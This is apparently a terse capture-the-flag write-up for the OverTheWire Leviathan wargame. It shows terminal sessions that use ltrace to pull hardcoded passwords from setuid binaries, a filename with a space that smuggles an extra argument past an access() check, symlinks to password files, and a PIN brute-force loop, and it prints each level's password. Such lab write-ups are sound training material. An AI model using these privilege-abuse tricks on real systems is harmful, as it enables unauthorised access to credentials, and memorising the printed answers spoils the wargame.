#  OverTheWire: Leviathan

http://overthewire.org/wargames/leviathan/

Self explantory write-up, explanations kept to a minimum

### Level 0

```
root@kali:~# ssh leviathan0@leviathan.labs.overthewire.org -p 2223
 _            _       _   _                 
| | _____   _(_) __ _| |_| |__   __ _ _ __  
| |/ _ \ \ / / |/ _` | __| '_ \ / _` | '_ \ 
| |  __/\ V /| | (_| | |_| | | | (_| | | | |
|_|\___| \_/ |_|\__,_|\__|_| |_|\__,_|_| |_|
                                            
a http://www.overthewire.org wargame.

leviathan0@leviathan.labs.overthewire.org's password: 
Welcome to Ubuntu 14.04 LTS (GNU/Linux 4.4.0-92-generic x86_64)

 * Documentation:  https://help.ubuntu.com/

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.


leviathan0@leviathan:~$ ls -lah
total 28K
drwxr-xr-x  4 leviathan0 leviathan0 4.0K Oct  5 20:00 .
drwxr-xr-x 11 root       root       4.0K Oct  5 20:00 ..
drwxr-x---  2 leviathan1 leviathan0 4.0K Oct  2 04:15 .backup
-rw-r--r--  1 leviathan0 leviathan0  220 Apr  9  2014 .bash_logout
-rw-r--r--  1 leviathan0 leviathan0 3.6K Apr  9  2014 .bashrc
drwx------  2 leviathan0 leviathan0 4.0K Oct  5 20:00 .cache
-rw-r--r--  1 leviathan0 leviathan0  675 Apr  9  2014 .profile
leviathan0@leviathan:~$ cd .backup
leviathan0@leviathan:~/.backup$ ls -lah
total 140K
drwxr-x--- 2 leviathan1 leviathan0 4.0K Oct  2 04:15 .
drwxr-xr-x 4 leviathan0 leviathan0 4.0K Oct  5 20:00 ..
-rw-r----- 1 leviathan1 leviathan0 131K Oct  2 04:15 bookmarks.html
leviathan0@leviathan:~/.backup$ cat bookmarks.html
leviathan0@leviathan:~/.backup$ cat bookmarks.html | grep "leviathan"
<DT><A HREF="http://leviathan.labs.overthewire.org/passwordus.html | This will be fixed later, the password for leviathan1 is rioGegei8m" ADD_DATE="1155384634" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">password to leviathan1</A>
```

### Level 1

```
leviathan1@leviathan:~$ ls
check
leviathan1@leviathan:~$ ltrace ./check
__libc_start_main(0x804852d, 1, 0xffffd7d4, 0x80485f0 <unfinished ...>
printf("password: ")                                                                     = 10
getchar(0x8048680, 47, 0x804a000, 0x8048642password:      
)                                             = 10
getchar(0x8048680, 47, 0x804a000, 0x8048642
)                                             = 10
getchar(0x8048680, 47, 0x804a000, 0x8048642
)                                             = 10
strcmp("\n\n\n", "sex")                                                                  = -1
puts("Wrong password, Good Bye ..."Wrong password, Good Bye ...
)                                                     = 29
+++ exited (status 0) +++
leviathan1@leviathan:~$ ./check    
password: sex
$ cat /etc/leviathan_pass/leviathan2
ougahZi8Ta
```


### Level 2

```
leviathan2@leviathan:~$ ls 
printfile
leviathan2@leviathan:~$ ./printfile 
*** File Printer ***
Usage: ./printfile filename
leviathan2@leviathan:~$ mkdir /tmp/test
leviathan2@leviathan:~$ echo "test" > /tmp/test/testfile
leviathan2@leviathan:~$ ./printfile /tmp/test/testfile
test
leviathan2@leviathan:~$ 
leviathan2@leviathan:~$ ltrace ./printfile /tmp/test/testfile
__libc_start_main(0x804852d, 2, 0xffffd7c4, 0x8048600 <unfinished ...>
access("/tmp/test/testfile", 4)                  = 0
snprintf("/bin/cat /tmp/test/testfile", 511, "/bin/cat %s", "/tmp/test/testfile") = 27
system("/bin/cat /tmp/test/testfile" <no return ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                           = 0
+++ exited (status 0) +++

leviathan2@leviathan:~$ ./printfile /etc/leviathan_pass/leviathan3
You cant have that file...

```

We see that it uses an access function (man access says it check real user's permissions for a file) and then uses /bin/cat to display it. The exploit here is to bypass access and then cat the leviathan3 pass.

```
leviathan2@leviathan:~$ touch "pass pass1" 
leviathan2@leviathan:~$ ln -s /etc/leviathan_pass/leviathan3 pass   
leviathan2@leviathan:~$ ls -l
total 8
lrwxrwxrwx 1 leviathan2 leviathan2   30 Oct  5 22:04 pass -> /etc/leviathan_pass/leviathan3
-rw-rw-r-- 1 leviathan2 leviathan2    0 Oct  5 22:05 pass pass1
-r-sr-x--- 1 leviathan3 leviathan2 7506 Oct  2 04:15 printfile
leviathan2@leviathan:~$ ./printfile "pass pass1"
Ahdiemoo1j
/bin/cat: pass1: No such file or directory


(to understand)
leviathan2@leviathan:~$ ltrace ./printfile "pass pass1"
__libc_start_main(0x804852d, 2, 0xffffd7c4, 0x8048600 <unfinished ...>
access("pass pass1", 4)                          = 0
snprintf("/bin/cat pass pass1", 511, "/bin/cat %s", "pass pass1") = 19
system("/bin/cat pass pass1"/bin/cat: pass: Permission denied
/bin/cat: pass1: No such file or directory
 <no return ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                           = 256
+++ exited (status 0) +++
leviathan2@leviathan:~$ 

```

### Level 3

```
iathan3@leviathan:~$ ls -lah
total 36K
drwxr-xr-x  3 leviathan3 leviathan3 4.0K Oct  5 22:07 .
drwxr-xr-x 11 root       root       4.0K Oct  5 22:07 ..
-rw-r--r--  1 leviathan3 leviathan3  220 Apr  9  2014 .bash_logout
-rw-r--r--  1 leviathan3 leviathan3 3.6K Apr  9  2014 .bashrc
drwx------  2 leviathan3 leviathan3 4.0K Oct  5 22:07 .cache
-rw-r--r--  1 leviathan3 leviathan3  675 Apr  9  2014 .profile
-r-sr-x---  1 leviathan4 leviathan3 9.8K Oct  2 04:15 level3
leviathan3@leviathan:~$ ./level3
Enter the password> 
bzzzzzzzzap. WRONG
leviathan3@leviathan:~$ ltrace ./level3 
__libc_start_main(0x80485fe, 1, 0xffffd7d4, 0x80486d0 <unfinished ...>
strcmp("h0no33", "kakaka")                       = -1
printf("Enter the password> ")                   = 20
fgets(Enter the password> test
"test\n", 256, 0xf7fccc20)                 = 0xffffd5cc
strcmp("test\n", "snlprintf\n")                  = 1   <-----------------------compares the strings, same as level 1
puts("bzzzzzzzzap. WRONG"bzzzzzzzzap. WRONG
)                       = 19
+++ exited (status 0) +++

leviathan3@leviathan:~$ ./level3
Enter the password> snlprintf\
bzzzzzzzzap. WRONG
leviathan3@leviathan:~$ ./level3
Enter the password> snlprintf 
[You've got shell]!
$ cat /etc/leviathan_pass/leviathan4     
vuH0coox6m
```

### Level 4

```
leviathan4@leviathan:~$ ls -lah
total 28K
drwxr-xr-x  4 leviathan4 leviathan4 4.0K Oct  5 22:10 .
drwxr-xr-x 11 root       root       4.0K Oct  5 22:10 ..
-rw-r--r--  1 leviathan4 leviathan4  220 Apr  9  2014 .bash_logout
-rw-r--r--  1 leviathan4 leviathan4 3.6K Apr  9  2014 .bashrc
drwx------  2 leviathan4 leviathan4 4.0K Oct  5 22:10 .cache
-rw-r--r--  1 leviathan4 leviathan4  675 Apr  9  2014 .profile
dr-xr-x---  2 root       leviathan4 4.0K Oct  2 04:15 .trash
leviathan4@leviathan:~$ cd .trash
leviathan4@leviathan:~/.trash$ ls -lah
total 16K
dr-xr-x--- 2 root       leviathan4 4.0K Oct  2 04:15 .
drwxr-xr-x 4 leviathan4 leviathan4 4.0K Oct  5 22:10 ..
-r-sr-x--- 1 leviathan5 leviathan4 7.3K Oct  2 04:15 bin
leviathan4@leviathan:~/.trash$ ./bin
01010100 01101001 01110100 01101000 00110100 01100011 01101111 01101011 01100101 01101001 00001010 

(Binary to ASCII: Tith4cokei)

```

### Level 5

```
leviathan5@leviathan:~$ ./leviathan5
Cannot find /tmp/file.log
leviathan5@leviathan:~$ ln -s /etc/leviathan_pass/leviathan6 /tmp/file.log
leviathan5@leviathan:~$ ./leviathan5
UgaoFee4li
```

### Level 6
Use script below to get ahy7MaeBo9

```
#!/bin/bash

for a in {0000..9999}
do
~/leviathan6 $a
done
```
